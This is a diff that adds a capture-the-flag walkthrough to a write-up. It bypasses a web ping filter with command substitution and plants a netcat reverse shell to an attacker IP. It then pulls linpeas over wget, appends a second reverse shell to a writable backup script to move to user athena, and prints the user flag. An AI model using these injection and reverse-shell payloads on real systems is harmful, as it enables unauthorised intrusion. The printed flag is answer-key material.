@@ -57,9 +57,101 @@ Leading to be flagged as `Attempt Hacking!`
 
 <img width="192" height="45" alt="Screenshot 2026-02-23 231517" src="https://github.com/user-attachments/assets/45fea67d-8013-427f-b06e-526fb53c580a" />
 
-After a while checking, I found the way to bypass the filter by combining like this
-<img width="1919" height="730" alt="Screenshot 2026-02-23 233735" src="https://github.com/user-attachments/assets/ee8bee1b-0346-4854-ae15-f1fd7a3304b0" />
-<img width="540" height="72" alt="Screenshot 2026-02-23 233751" src="https://github.com/user-attachments/assets/f553dadf-7e7b-471a-b675-35f67cfccedf" />
+After a while checking, I found the way to bypass the filter by combining like this, this method is so called command substitution
+On the site
+```
+localhost `$(nc 192.168.140.91 1234 -e /bin/bash)`
+```
 
+On my attack machine
+```
+$ nc -lnvp 1234                                                                               
+listening on [any] 1234 ...
+connect to [192.168.140.91] from (UNKNOWN) [10.49.182.133] 34008
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
+It's time for stablizing the shell. First checking whether python is installed or not
+```
+which python3
+/usr/bin/python3
+```
 
+Now it's time to upgrade from simple shell into interactive shell
+```
+SHELL=/bin/bash script -q /dev/null
+OR
+python3 -c "import pty; pty.spawn('/bin/bash')"
+```
+
+Reference :
+[shells](https://0xffsec.com/handbook/shells/full-tty/)
+
+# Privilege Escalation
+Now I have to import linpeas to the target for further investigating
+On my machine in the directory holding linpeas
+```
+python3 -m http.server 4444
+```
+
+On target
+```
+cd /tmp #Which have read/write/execute privilege
+wget http://<Attack Machine IP>:4444/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+Target OS: Ubuntu 20.04.6 TLS
+Sudo version 1.8.31 
+```
+╔══════════╣ Users with console
+athena:x:1001:1001::/home/athena:/bin/bash                                                                          
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
+```
+```
+drwxr-xr-x 2 athena www-data 4096 May 28  2023 /usr/share/backup
+total 4
+-rwxr-xr-x 1 www-data athena 258 May 28  2023 backup.sh
+```
+
+I can see that `backup.sh` is written by my current user
+```
+#!/bin/bash
+
+backup_dir_zip=~/backup
+
+mkdir -p "$backup_dir_zip"
+
+cp -r /home/athena/notes/* "$backup_dir_zip"
+
+zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"
+
+rm /home/athena/backup/*.txt
+rm /home/athena/backup/*.sh
+
+echo "Backup completed..."
+```
+
+So basically this file is going to copy all the content of `/honme/athena/notes/` into backup folder then zip them, all of these happne in athena so I am going to establish another reverse shell by appending this payload
+```
+echo "nc <IP> 5678 -e /bin/bash" >> /usr/share/backup/backup.sh
+```
+
+Then in my attack machine
+```
+nc -lnvp 5678
+```
+just a few minutes and I got connected again, which then I stablizing the shell
+```
+athena@routerpanel:/$ whoami
+whoami
+athena
+athena@routerpanel:~$ cat user.txt
+cat user.txt
+857c4a4fbac638afb6c7ee45eb3e1a28
+```
+
+Got the first flag
